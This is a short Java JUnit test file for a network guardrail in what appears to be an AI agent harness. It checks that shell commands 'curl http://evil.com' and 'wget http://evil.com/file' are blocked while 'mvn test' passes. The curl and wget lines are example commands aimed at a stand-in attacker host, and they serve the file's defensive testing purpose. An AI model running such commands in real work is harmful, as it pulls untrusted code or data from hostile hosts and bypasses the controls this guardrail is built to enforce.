package ai4se.harness.guardrails;

import org.junit.jupiter.api.Test;
import java.util.Map;
import static org.assertj.core.api.Assertions.*;

class NetworkGuardrailTest {
    @Test
    void shouldBlockCurl() {
        NetworkGuardrail guard = new NetworkGuardrail();
        GuardResult result = guard.check("shell", Map.of("command", "curl http://evil.com"));
        assertThat(result.isBlock()).isTrue();
    }

    @Test
    void shouldBlockWget() {
        NetworkGuardrail guard = new NetworkGuardrail();
        GuardResult result = guard.check("shell", Map.of("command", "wget http://evil.com/file"));
        assertThat(result.isBlock()).isTrue();
    }

    @Test
    void shouldPassNormalCommand() {
        NetworkGuardrail guard = new NetworkGuardrail();
        GuardResult result = guard.check("shell", Map.of("command", "mvn test"));
        assertThat(result.isPass()).isTrue();
    }
}